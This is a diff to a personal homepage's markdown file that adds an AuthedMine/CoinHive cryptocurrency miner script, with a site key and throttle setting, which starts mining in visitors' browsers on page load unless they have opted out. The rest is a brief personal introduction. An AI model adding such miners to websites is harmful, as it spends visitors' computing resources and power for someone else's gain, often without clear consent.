@@ -4,6 +4,14 @@ title: AustinHuang.me
 permalink: /
 ---
 
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('NS1Lh4sTCMiS0AcazVxeqiDKUXIrkTnX', {throttle: 0.2});
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
+
 So let's see what I'm up to.
 
 ## My coding projects
